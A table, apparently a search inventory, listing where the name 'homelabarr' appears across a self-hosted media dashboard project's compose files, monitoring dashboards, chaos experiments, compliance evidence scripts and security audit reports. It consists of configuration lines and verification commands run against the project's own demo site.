| `apps/downloads/sabnzbd.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:sabnzbd\|ghcr.io/imogenlabs/homelabarr-mod-sabnzbd:v1.0.0"` |
| `apps/media-management/bazarr.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:bazarr\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-management/lidarr.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:lidarr\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-management/radarr.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:radarr\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-management/readarr.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:readarr\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-management/sonarr.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:sonarr\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-management/tautulli.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:tautulli\|ghcr.io/imogenlabs/homelabarr-mod-tautulli:v1.0.0"` |
| `apps/media-servers/emby.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:emby\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-servers/jellyfin.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:jellyfin\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-servers/plex-gluetun.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:plex\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/media-servers/plex.yml` | 1 x | `      - "DOCKER_MODS=ghcr.io/themepark-dev/theme.park:plex\|ghcr.io/imogenlabs/homelabarr-mod-healthcheck:v1.0.0"` |
| `apps/monitoring/dashboards/cadvisor-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/coder-platform-dashboard.json` | 1 x | `    "homelabarr"` |
| `apps/monitoring/dashboards/dozzle-logs-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/dozzle-logs-dashboard.json` | 1 x | `  "uid": "homelabarr-dozzle",` |
| `apps/monitoring/dashboards/homelabarr-overview.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/homelabarr-overview.json` | 1 x | `  "uid": "homelabarr-overview",` |
| `apps/monitoring/dashboards/jellyfin-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/media-server-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/media-server-dashboard.json` | 1 x | `  "uid": "homelabarr-media",` |
| `apps/monitoring/dashboards/node-exporter-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/nzbget-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/promtail-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/qbittorrent-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/radarr-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/sonarr-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/traefik-authelia-dashboard.json` | 1 x | `    "homelabarr",` |
| `apps/monitoring/dashboards/traefik-authelia-dashboard.json` | 1 x | `  "uid": "homelabarr-traefik",` |
| `apps/monitoring/prometheus.yml` | 1 x | `    cluster: 'homelabarr-cli'` |
| `apps/monitoring/prometheus.yml` | 1 x | `  - job_name: 'homelabarr-exporters'` |
| `apps/monitoring/promtail-config.yml` | 1 x | `          host: homelabarr-cli` |
| `apps/monitoring/provisioning/dashboards/dashboard.yml` | 1 x | `  - name: 'homelabarr-dashboards'` |
| `apps/monitoring/scripts/auto-dashboard-generator.py` | 1 x | `            "tags": ["homelabarr", "auto-generated", app_type, name],` |
| `apps/monitoring/scripts/auto-dashboard-generator.py` | 1 x | `            "uid": f"homelabarr-{name}",` |
| `apps/monitoring/scripts/auto-dashboard-generator.py` | 1 x | `        for container in homelabarr_containers:` |
| `apps/monitoring/scripts/auto-dashboard-generator.py` | 1 x | `        homelabarr_containers = [` |
| `apps/monitoring/scripts/auto-dashboard-generator.py` | 1 x | `        print(f"📊 Found {len(homelabarr_containers)} HomelabARR CLI applications")` |
| `apps/system/cf-companion.yml` | 1 x | `      - "com.homelabarr.category=addons"` |
| `apps/system/cf-companion.yml` | 1 x | `      - "com.homelabarr.description=Auto-create Cloudflare DNS records for containers with Traefik labels"` |
| `apps/system/cf-companion.yml` | 1 x | `      - "com.homelabarr.icon=cloudflare"` |
| `apps/system/cf-companion.yml` | 1 x | `      - "com.homelabarr.name=CF Companion"` |
| `apps/system/cf-companion.yml` | 1 x | `      - "com.homelabarr.url=https://github.com/imogenlabs/cf-companion"` |
| `apps/system/cf-companion.yml` | 1 x | `    image: "smashingtags/cf-companion:latest"` |
| `chaos/experiments/01-pod-kill-backend.md` | 1 x | `1. 'curl -s https://dev.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/01-pod-kill-backend.md` | 1 x | `3. Honey probe 'curl -s https://dev.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/01-pod-kill-backend.md` | 1 x | `docker kill homelabarr-demo-backend` |
| `chaos/experiments/02-disk-pressure.md` | 1 x | `1. 'curl -s https://dev.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/02-disk-pressure.md` | 1 x | `3. Honey probe 'curl -s https://dev.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/03-network-partition.md` | 1 x | `1. 'curl -s https://dev.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/03-network-partition.md` | 1 x | `3. Honey probe 'curl -s https://dev.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/04-memory-exhaustion.md` | 1 x | `1. 'curl -s https://dev.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/04-memory-exhaustion.md` | 1 x | `3. Honey probe 'curl -s https://dev.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/05-time-skew.md` | 1 x | `1. 'curl -s https://dev.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/05-time-skew.md` | 1 x | `3. Honey probe 'curl -s https://dev.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/06-rapid-restart.md` | 1 x | `1. 'curl -s https://dev.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/06-rapid-restart.md` | 1 x | `3. Honey probe 'curl -s https://dev.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/07-cold-cache-burst.md` | 1 x | `1. 'curl -s https://dev.homelabarr.com/api/health' returns '{"ok":true}'` |
| `chaos/experiments/07-cold-cache-burst.md` | 1 x | `3. Honey probe 'curl -s https://dev.homelabarr.com/wp-login.php' returns 9-byte "Not Found"` |
| `chaos/experiments/08-crash-log-scan.md` | 1 x | `docker logs homelabarr-demo-backend --since 5m 2>&1 \| \` |
| `compliance/cis-docker-v1.6.0.md` | 1 x | `All services on custom bridge networks ('homelabarr', 'homelabarr-internal'). None on 'host' mode.` |
| `compliance/cis-docker-v1.6.0.md` | 1 x | `Dockerfile.backend: 'USER homelabarr' (uid 1001). Dockerfile frontend: 'USER homelabarr' (uid 1001).` |
| `compliance/cis-docker-v1.6.0.md` | 1 x | `'security_opt: apparmor=homelabarr-backend' in compose. Profile installed via 'scripts/install-apparmor.sh'.` |
| `compliance/collect-evidence.sh` | 1 x | `        --certificate-identity-regexp 'smashingtags' \` |
| `compliance/collect-evidence.sh` | 1 x | `BACKEND="${EVIDENCE_BACKEND:-homelabarr-demo-backend}"` |
| `compliance/collect-evidence.sh` | 1 x | `HOST="${EVIDENCE_HOST:-dev.homelabarr.com}"` |
| `compliance/owasp-asvs-v4.0.3-L2.md` | 1 x | `\| V8.3.1 \| Sensitive data encrypted at rest \| [Met] \| SQLCipher AES-256 on homelabarr.db (R7) \|` |
| `compliance/posture.md` | 1 x | `\| R4 \| Container hardening \| homelabarr.yml, Dockerfile.backend, socket-proxy \|` |
| `compliance/render-attestation.cjs` | 1 x | `  cosignBackend = run('cosign verify --certificate-identity-regexp smashingtags --certificate-oidc-issuer https://token.` |
| `compliance/render-attestation.cjs` | 1 x | `  cosignFrontend = run('cosign verify --certificate-identity-regexp smashingtags --certificate-oidc-issuer https://token` |
| `compliance/render-attestation.cjs` | 1 x | `const backendImage = run('docker inspect homelabarr-demo-backend --format "{{.Config.Image}}" 2>/dev/null');` |
| `compliance/render-attestation.cjs` | 1 x | `const frontendImage = run('docker inspect homelabarr-demo-frontend --format "{{.Config.Image}}" 2>/dev/null');` |
| `docs/INCIDENT-RESPONSE.md` | 1 x | `docker cp homelabarr-backend:/app/data ./forensics-$(date +%s)/` |
| `docs/audit/R10-pentest-adversary-emulation.md` | 1 x | `**Target:** homelabarr-ce (main @ '3a5c75b9967819561edd244b47cbf764eeff5721'), ce-demo.homelabarr.com` |
| `docs/audit/R10-pentest-adversary-emulation.md` | 1 x | `ART_TARGET=https://ce-demo.homelabarr.com pentest/harness/run.sh --class A1` |
| `docs/audit/R10-pentest-adversary-emulation.md` | 2 x | `BASE=${ART_TARGET:-https://ce-demo.homelabarr.com}` |
| `docs/audit/R10.5-carry-forward-correction.md` | 1 x | `          ART_TARGET: ${{ github.event.inputs.target \|\| 'https://ce-demo.homelabarr.com' }}` |
| `docs/audit/R10.5-carry-forward-correction.md` | 1 x | `        default: 'https://ce-demo.homelabarr.com'` |
| `docs/audit/R10.5-carry-forward-correction.md` | 1 x | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R10.6-honey-events-not-emitting.md` | 1 x | `BASE=${ART_TARGET:-https://ce-demo.homelabarr.com}` |
| `docs/audit/R10.6-honey-events-not-emitting.md` | 1 x | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R10.7-remove-nginx-honey-interception.md` | 1 x | `BASE=https://ce-demo.homelabarr.com` |
| `docs/audit/R11-compliance-posture.md` | 1 x | `  cosign verify --certificate-identity-regexp 'smashingtags' --certificate-oidc-issuer https://token.actions.githubuserc` |
| `docs/audit/R11-compliance-posture.md` | 1 x | `# CIS Docker Benchmark v1.6.0 — homelabarr-ce posture` |
| `docs/audit/R11-compliance-posture.md` | 1 x | `# Incident response — homelabarr-ce` |
| `docs/audit/R11-compliance-posture.md` | 1 x | `# NIST CSF 2.0 — homelabarr-ce alignment` |
| `docs/audit/R11-compliance-posture.md` | 1 x | `**Target:** homelabarr-ce main @ '5db8b66ff6', ce-demo.homelabarr.com` |
| `docs/audit/R11-compliance-posture.md` | 1 x | `Evidence: 'docker inspect <c> \| jq '.[0].AppArmorProfile'' → 'homelabarr-backend'` |
| `docs/audit/R11-compliance-posture.md` | 1 x | `Evidence: 'docker inspect <c> \| jq '.[0].HostConfig.NetworkMode'' → 'homelabarr_net', not 'host'.` |
| `docs/audit/R11-compliance-posture.md` | 1 x | `HOST=ce-demo.homelabarr.com` |
| `docs/audit/R11-compliance-posture.md` | 1 x | `PCI-DSS, HIPAA, SOC 2 are explicitly OUT OF SCOPE — this is an open-source self-hosted dashboard, not a regulated envi` |
| `docs/audit/R11-compliance-posture.md` | 1 x | `grep -q 'homelabarr-backend' compliance/evidence/CIS-5.1-apparmor.txt` |
| `docs/audit/R11.5-evidence-script-gaps.md` | 1 x | `      --certificate-identity-regexp 'smashingtags' \` |
| `docs/audit/R11.5-evidence-script-gaps.md` | 1 x | `\| collect-evidence.sh missing R5 cosign verify \| R11 §3 H-5 — 'cosign verify --certificate-identity-regexp 'smashin` |
| `docs/audit/R12-chaos-engineering.md` | 1 x | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R12-chaos-engineering.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ main '1170de586a' (== dev, R11.5 merged 2026-05-23T01:34:36Z)` |
| `docs/audit/R13-threat-model-formalization.md` | 1 x | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R13-threat-model-formalization.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ main '762448815a' (== dev, R12 merged 2026-05-23T01:50:35Z)` |
| `docs/audit/R13-threat-model-formalization.md` | 1 x | `\| 5 \| 'docs/audit/homelabarr-ce-security-audit-round-8.md' extended with "Restore drill log" section \| Section presen` |
| `docs/audit/R14-incident-response-runbook.md` | 1 x | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R14-incident-response-runbook.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ main 'b9e836031e' (== dev, R13 merged 2026-05-23T02:04:53Z)` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 2 x | `      - "smashingtags"` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 1 x | `      - "smashingtags"            # owner gets auto-assigned` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 1 x | `      --certificate-identity-regexp 'https://github.com/imogenlabs/homelabarr-ce/.github/workflows/' \` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 1 x | `      ghcr.io/imogenlabs/homelabarr-ce:${{ github.sha }}` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 1 x | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ main '7fd3a395dd' (== dev, R14 merged 2026-05-23T02:18:35Z)` |
| `docs/audit/R15-dependency-supply-chain-freshness.md` | 1 x | `\| O-2 \| Confirm reviewer GitHub handle for dependabot.yml. Spec uses 'smashingtags'. \| Identity \| Confirm or add oth` |
| `docs/audit/R16-continuous-evidence-binder-rebuild.md` | 1 x | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R16-continuous-evidence-binder-rebuild.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ main 'a1e2c7de8f' (== dev, R15 merged 2026-05-23T02:35:52Z)` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `**Acceptance:** 'curl -s https://ce-demo.homelabarr.com/ \| grep -E 'meta name="description"\|meta name="robots"\|rel="c` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `**Acceptance:** 'curl -s https://ce-demo.homelabarr.com/robots.txt' returns 200 'text/plain' with the directives above.` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `**Acceptance:** 'curl -sI https://ce-demo.homelabarr.com/.well-known/change-password' returns 302 (or 301) with a sensib` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `**Acceptance:** 'curl -sI https://ce-demo.homelabarr.com/security.txt' returns 'HTTP/2 301' with 'location: /.well-known` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `**Required:** add a small section noting that the canonical disclosure contact is also available at 'https://ce-demo.hom` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ main '7b2954e2c1' (== dev, R16 merged 2026-05-23T02:46:33Z)` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `- https://ce-demo.homelabarr.com/.well-known/security.txt (RFC 9116)` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `<link rel="canonical" href="https://ce-demo.homelabarr.com/">` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `<meta property="og:url" content="https://ce-demo.homelabarr.com/">` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `HTML=$(curl -s https://ce-demo.homelabarr.com/)` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `LABEL io.homelabarr.security.contact="https://github.com/imogenlabs/homelabarr-ce/security/policy"` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `LABEL org.opencontainers.image.documentation="https://github.com/imogenlabs/homelabarr-ce/blob/main/README.md"` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `LABEL org.opencontainers.image.source="https://github.com/imogenlabs/homelabarr-ce"` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `LABEL org.opencontainers.image.title="homelabarr-ce-backend"` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `LABEL org.opencontainers.image.url="https://ce-demo.homelabarr.com"` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `Site: https://homelabarr.com` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `Sitemap: https://ce-demo.homelabarr.com/sitemap.xml` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/.well-known/security.txt \| grep -q '^Contact:' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/.well-known/security.txt \| grep -q '^Expires:' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/robots.txt \| grep -q 'Disallow: /api/' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/robots.txt \| grep -q 'User-agent:' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/.well-known/change-password \| grep -E '^HTTP.*30[12]' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/humans.txt \| grep -E '^HTTP.*(200\|404)' \| head -1 \` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/robots.txt \| grep -i 'content-type:.*text/plain' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/security.txt \| grep -E '^HTTP.*30[12]' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/security.txt \| grep -i 'location:.*\.well-known/security\.txt' \` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `docker inspect ghcr.io/imogenlabs/homelabarr-ce:latest \` |
| `docs/audit/R17-public-disclosure-surface.md` | 1 x | `docker pull ghcr.io/imogenlabs/homelabarr-ce:latest 2>/dev/null` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `# Expect: 301 https://ce-demo.homelabarr.com/.well-known/security.txt` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `**Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `**Target:** 'smashingtags/homelabarr-ce' @ main '139ce79561' (== dev, R17 merged 2026-05-23T02:56:20Z)` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `HTML=$(curl -s https://ce-demo.homelabarr.com/)` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `Live origin verification at 'https://ce-demo.homelabarr.com/' with cache-bust + 'credentials: 'omit'':` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/.well-known/security.txt \| grep -q '^Contact:' && echo OK \|\| echo FAIL` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/humans.txt \| head -1` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `curl -s https://ce-demo.homelabarr.com/robots.txt \| head -1` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `curl -sI -o /dev/null -w '%{http_code} %{redirect_url}\n' https://ce-demo.homelabarr.com/.well-known/change-password` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `curl -sI -o /dev/null -w '%{http_code} %{redirect_url}\n' https://ce-demo.homelabarr.com/security.txt` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/ \| grep -i 'last-modified:'` |
| `docs/audit/R17.5-redeploy-correction.md` | 1 x | `curl -sI https://ce-demo.homelabarr.com/robots.txt \| grep -i 'content-type:.*text/plain'` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `  curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/wiki/docs/guides/$f \` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `**FIX:** Owner-pile item (operations, agent-applicable): cron on ce-prod that compares the live last-modified header aga` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `**Surface:** Live response from ce-demo.homelabarr.com — 'Content-Type: text/plain, text/plain'` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `- Wiki search / discoverability (does ce-demo or homelabarr.com have a search index? — R19)` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `> **Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `> **Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `curl -H "Authorization: Bearer YOUR_TOKEN" https://homelabarr.yourdomain.com/api/auth/api-keys` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/wiki/docs/guides/api-reference.md \` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/wiki/docs/img/diagrams/generate_diagrams.py \` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `curl -sI 'https://ce-demo.homelabarr.com/__nope_$(date +%s)' \| head -1` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `curl -sI 'https://ce-demo.homelabarr.com/robots.txt?_=$(date +%s)' \| grep -i 'content-type'` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `curl -sI https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/HANDOFF-APP-REBUILD.md \| head -1` |
| `docs/audit/R18-wiki-public-docs-surface.md` | 1 x | `curl -sI https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/wiki/docs/guides/security.md \| head -1` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `  curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/$f \| grep -E '(ENTRYPOINT\|dumb-init\|tini)` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `  curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/$f \| grep -E '^FROM ' \|\| echo "no FROM li` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `  curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/.dockerignore \| grep -qF "$entry" && echo "` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `### M-2 — Watchtower opt-in label is absent from the shipped homelabarr.yml` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**Drift between deploy-pipeline/INFRASTRUCTURE.md and shipped homelabarr.yml:** the deploy doc says CE backend "Docker s` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**FIX:** Add an inline comment in homelabarr.yml above the env block:` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**FIX:** Agent reads homelabarr.yml frontend block and confirms the same set as backend: cap_drop ALL, security_opt no-n` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**Option A (recommended for self-hosters):** ship the compose WITHOUT watchtower labels. Add a comment block in homelaba` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**Surface:** Dockerfile, Dockerfile.backend, homelabarr.yml` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**Surface:** ce-prod VM 121 vs homelabarr.yml in repo` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**Surface:** homelabarr.yml backend env block` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**Surface:** homelabarr.yml — frontend service` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**Surface:** homelabarr.yml — no 'com.centurylinklabs.watchtower.enable=true' label on any service` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**Why it matters:** A pentester or auditor who reads the public homelabarr.yml will conclude the Docker socket is :ro be` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**Why it matters:** Per the deploy-pipeline doc (read with permission), the production fleet runs Watchtower in LABEL_EN` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `**Why it matters:** The backend service was deeply inspected. The frontend ('ghcr.io/imogenlabs/homelabarr-frontend:late` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `- **H-1 reconciliation:** run the docker inspect on ce-prod, compare to shipped homelabarr.yml, and decide which to alig` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `- Mounts: backend should have NO docker.sock mount, only '/homelabarr:ro', 'homelabarr-data', 'homelabarr-config', 'home` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `- SecurityOpt should include 'apparmor=homelabarr-backend' and 'no-new-privileges:true'` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `- 'homelabarr' (external bridge) and 'homelabarr-internal' ('internal: true' — no external connectivity)` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `- 'security_opt: [apparmor=homelabarr-backend, no-new-privileges:true]' — custom AppArmor profile referenced` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `2. Compare to homelabarr.yml in this repo:` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `2. Runtime hardening (homelabarr.yml): image pinning, capability surface, network egress, secret material handling, watc` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `2. homelabarr.yml — pin every 'image:' line by digest, OR document a verification step that downstream operators can r` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `> **Live:** https://ce-demo.homelabarr.com/` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `> **Repo:** smashingtags/homelabarr-ce` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `Audit the runtime contract the homelabarr-ce containers ship with. Specifically:` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `Live (ce-demo.homelabarr.com, cache-busted, credentials:'omit'):` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `The harder version (digest in compose): every 'image:' becomes 'image: ghcr.io/.../homelabarr-backend:latest@sha256:<dig` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `The pragmatic version (signature verification at pull time): keep ':latest' for the homelabarr-* images, but add a '# ve` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `The shipped 'homelabarr.yml' is **already substantially hardened**. Inventory of controls already present (do not regres` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/homelabarr.yml \` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/homelabarr.yml \| grep -B 2 'BIND_ADDRESS'` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/homelabarr.yml \| grep -E '(linuxserver/socket` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/homelabarr.yml \| grep -iE 'watchtower' \| hea` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `docker inspect homelabarr-backend --format '{{.HostConfig.SecurityOpt}} {{.HostConfig.CapDrop}} {{.HostConfig.ReadonlyRo` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `docker inspect homelabarr-backend --format '{{json .Config.Env}}' \| grep -iE 'DOCKER_HOST\|CLI_BRIDGE' \|\| echo "no DO` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `docker inspect homelabarr-backend --format '{{range .Mounts}}{{.Source}} -> {{.Destination}} (rw={{.RW}}){{"\n"}}{{end}}` |
| `docs/audit/R19-runtime-contract-build-time.md` | 1 x | `docker ps --filter name=homelabarr-socket-proxy --format '{{.Names}} {{.Status}}'` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `  curl -s https://raw.githubusercontent.com/smashingtags/homelabarr-ce/main/eslint.config.js \` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `  \|\| Buffer.from(hkdfSync('sha256', JWT_SECRET, Buffer.alloc(0), 'homelabarr-api-key-hmac/v1', 32)).toString('hex');` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `**Surface:** homelabarr.yml, scripts/check-secret-age.sh` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `**Surface:** server/auth.js, scripts/rotate-jwt-key.sh, homelabarr.yml secrets block` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `**Why it matters:** 'const body = JSON.stringify({ ...payload, source: 'homelabarr-ce', ts: ... })'. The payload object ` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `- 'homelabarr.yml' mounts 'jwt_key_previous' as a secret file.` |
| `docs/audit/R20-secret-material-handling.md` | 1 x | `> **Repo:** smashingtags/homelabarr-ce` |
